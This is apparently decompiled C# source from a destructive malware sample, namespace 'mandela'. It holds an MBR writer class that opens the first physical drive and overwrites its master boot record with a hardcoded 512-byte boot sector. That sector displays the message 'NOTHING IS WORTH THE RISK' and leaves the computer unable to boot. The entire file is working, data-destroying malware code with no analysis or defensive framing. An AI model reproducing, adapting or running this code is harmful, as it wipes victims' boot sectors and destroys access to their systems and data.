﻿using System;
using System.Runtime.InteropServices;

namespace mandela
{
	// Token: 0x02000009 RID: 9
	public class Mbr_Writter
	{
		// Token: 0x0600002B RID: 43
		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(string string_0, uint uint_0, uint uint_1, IntPtr intptr_0, uint uint_2, uint uint_3, IntPtr intptr_1);

		// Token: 0x0600002C RID: 44
		[DllImport("kernel32")]
		private static extern bool WriteFile(IntPtr intptr_0, byte[] byte_0, uint uint_0, out uint uint_1, IntPtr intptr_1);

		// Token: 0x0600002D RID: 45 RVA: 0x000060E0 File Offset: 0x000042E0
		public void Mbr()
		{
			byte[] array = new byte[]
			{
				49, 192, 142, 216, 142, 192, 142, 208, 188, 0,
				124, 137, 229, 104, 0, 160, 7, 49, byte.MaxValue, 49,
				192, 138, 30, 103, 124, 180, 0, 176, 19, 205,
				16, 180, 7, 176, 0, 185, 0, 0, 186, 79,
				24, 205, 16, 180, 2, 183, 0, 182, 10, 178,
				8, 205, 16, 190, 105, 124, 138, 4, 60, 0,
				116, 11, 232, 3, 0, 70, 235, 244, 180, 14,
				205, 16, 195, 180, 134, 185, 0, 0, 139, 22,
				102, 124, 205, 21, 58, 30, 104, 124, 116, 6,
				254, 195, 48, 223, 235, 191, 138, 30, 103, 124,
				235, 185, 1, 16, 31, 78, 79, 84, 72, 73,
				78, 71, 32, 73, 83, 32, 87, 79, 82, 84,
				72, 32, 84, 72, 69, 32, 82, 73, 83, 75,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				85, 170
			};
			uint num;
			Mbr_Writter.WriteFile(Mbr_Writter.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero), array, 512U, out num, IntPtr.Zero);
		}
	}
}
